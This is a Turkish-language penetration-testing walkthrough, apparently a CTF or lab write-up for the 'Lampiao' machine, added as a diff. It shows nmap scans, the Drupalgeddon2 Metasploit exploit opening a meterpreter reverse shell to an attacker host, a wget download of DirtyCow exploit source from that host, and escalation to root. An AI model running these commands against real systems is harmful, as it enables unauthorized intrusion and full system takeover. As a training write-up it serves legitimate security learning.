@@ -1,0 +1,157 @@
+      ####Enumeration
+
+      ####Nmap
+nmapTüm 65535 TCP bağlantı noktalarına karşı bir tarama çalıştırarak başlıyoruz :
+kali@kali:~$ sudo nmap -p- -T4 $targetip
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-16 20:19 SAST
+
+Nmap scan report for $targetip
+Host is up (0.24s latency).
+Not shown: 65470 closed ports, 62 filtered ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+1898/tcp open  cymtec-port
+1898 numaralı bağlantı noktasındaki hizmete karşı agresif bir tarama yapalım:
+kali@kali:~$ sudo nmap -A -p1898 $targetip
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-05 10:14 EST
+Nmap scan report for $targetip
+Host is up (0.028s latency).
+Not shown: 65370 closed ports, 162 filtered ports
+PORT     STATE SERVICE VERSION
+
+1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|/http-generator: Drupal 7 (http://drupal.org)
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
+|//LICENSE.txt /MAINTAINERS.txt
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: Lampi\xC3\xA3o
+...
+Sonuçlar, uygulamanın Drupal 7 tarafından desteklendiğini gösteriyor. Artık bir hedef uygulamamız olduğuna göre, Metasploit Konsolumuzu başlatabilir ve herhangi bir Drupal girişini arayabiliriz:
+
+kali@kali:~$ msfconsole
+...
+msf6 > search drupal
+
+Matching Modules
+================
+
+   #  Name                                           Disclosure Date  Rank       Check  Description
+   -  ——                                           ———————  ——       ——  —————
+   0  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
+   1  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
+   2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection
+   3  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution
+   4  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
+   5  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution
+   6  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE
+   7  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution
+
+      ####Exploitation
+
+DrupalGeddon2
+DrupalGeddon2 Bu hedefe karşı saldırı vektörümüz olarak kullanacağız :
+msf6 > use 4
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf6 exploit(unix/webapp/drupal_drupalgeddon2) > show payloads
+
+Compatible Payloads
+===================
+
+   #   Name                                Disclosure Date  Rank    Check  Description
+   -   ——                                ———————  ——    ——  —————
+...
+   16  php/meterpreter/reverse_tcp_uuid                     normal  No     PHP Meterpreter, PHP Reverse TCP Stager
+...
+Yükü php/meterpreter/reverse_tcp_uuid ve MSF konsol seçeneklerini aşağıdaki gibi ayarlayacağız:
+msf6 exploit(unix/webapp/drupal_drupalgeddon2) > options
+
+Module options (exploit/unix/webapp/drupal_drupalgeddon2):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   DUMP_OUTPUT  false            no        Dump payload command output
+   PHP_FUNC     passthru         yes       PHP function to execute
+   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS       $targetip        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT        1898             yes       The target port (TCP)
+   SSL          false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI    /                yes       Path to Drupal install
+   VHOST                         no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp_uuid):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  $attackerip      yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic (PHP In-Memory)
+İstismarı çalıştırdıktan sonra, ilk reverse shell'i hedefe aldığımızı görebiliriz:
+msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run
+
+[*] Started reverse TCP handler on $attackerip:4444 
+[*] Sending stage (39282 bytes) to $targetip
+[*] Meterpreter session 1 opened ($attackerip:4444 -> $targetip:50386) at 2020-12-22 08:20:53 -0500
+
+meterpreter > shell
+Process 1361 created.
+Channel 0 created.
+python -c 'import pty; pty.spawn("/bin/bash")'
+www-data@lampiao:/var/www/html$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+      ####Çekirdek Sürüm Numaralandırma
+Hedefin çekirdek sürümünü kontrol edelim:
+www-data@lampiao:/var/www/html$ uname -a
+uname -a
+Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux
+Bu çekirdek için yerel ayrıcalık yükseltme istismarlarını araştırmak bizi DirtyCow istismarına götürür.
+
+DirtyCow Ayrıcalığı Yükseltme
+C++ kaynak kod dosyasını HTTP üzerinden barındırabilir ve ardından hedefe indirebiliriz:
+kali@kali:~$ sudo python3 -m http.server 80                       
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+...
+www-data@lampiao:/var/www/html$ cd /tmp
+cd /tmp
+www-data@lampiao:/tmp$ wget http://$attackerip/40847.cpp
+wget http://$attackerip/40847.cpp
+--2020-12-22 11:25:41--  http://$attackerip/40847.cpp
+Connecting to $attackerip:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 10531 (10K) [text/x-c++src]
+Saving to: '40847.cpp'
+
+100%[======================================>] 10,531      --.-K/s   in 0s      
+
+2020-12-22 11:25:41 (112 MB/s) - '40847.cpp' saved [10531/10531]
+Kaynak kodu derledikten izinler verdikten ve exploit'i çalıştırdıktan sonra g++ çalıştırılabilir, root kullanıcısının parolası şu şekilde ayarlanır $password:
+www-data@lampiao:/tmp$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dirtycow 40847.cpp -lutil
+<-Wall -pedantic -O2 -std=c++11 -pthread -o dirtycow 40847.cpp -lutil        
+www-data@lampiao:/tmp$ chmod 777 dirtycow
+chmod 777 dirtycow
+www-data@lampiao:/tmp$ ./dirtycow
+./dirtycow
+Running ...
+Received su prompt (Password: )
+Root password is:   $password
+Enjoy! :-)
+Artık root olarak giriş yapmak için bu şifreyi kullanabiliriz:
+www-data@lampiao:/tmp$ su
+su
+Password: dirtyCowFun
+
+root@lampiao:/tmp# id
+id
+uid=0(root) gid=0(root) groups=0(root)
